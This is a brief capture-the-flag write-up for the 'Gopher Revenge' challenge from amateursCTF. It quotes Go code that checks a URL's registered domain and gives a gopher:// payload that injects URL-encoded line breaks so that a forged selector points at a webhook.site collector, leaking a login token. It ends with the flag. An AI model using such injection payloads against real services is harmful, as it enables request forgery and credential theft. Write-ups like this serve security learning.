---
title: 'Gopher Revenge'
date: '2023-09-23'
---

- Similar as go-gopher chall, except we can use our webhook site, because this chall checks URL: 

```go
	rawURL, _ := strings.CutPrefix(res.Dir.Items[2].Selector, "URL:")
	fmt.Println(rawURL)

	u, err := url.Parse(rawURL)

	etldpo, err2 := publicsuffix.EffectiveTLDPlusOne(u.Host)
	if err != nil || err2 != nil || etldpo != "amt.rs" {
		return "Invalid url"
	}
```
- Previous payload: 
```w!
gopher://amt.rs:31290/1/submit/%250as%250ds%250d%250A0%2509URL:https:%252F%252Fwebhook.site%252F9170beae-82e8-408d-bc36-b111a41a22c2%2509anything%250980%2509 gopher://amt.rs:31290/1/submit/%250as%250ds%250d%250A0%2509URL:https:%252F%252Fwebhook.site%252F9170beae-82e8-408d-bc36-b111a41a22c2%2509anything%250980%2509 
```

![](https://hackmd.io/_uploads/Hkn9PyPc2.png)

- Now, we just need to change the url to domain that contains amt.rs in public suffix.
- We can use this task, to have a register url, change url to https://cps.amt.rs/register.php
![](https://hackmd.io/_uploads/Bke1dyDqh.png)
- And we have a token, login and get flag. 


> **amateursCTF{ye5._ h1s_1s_g0pher_h3ll}**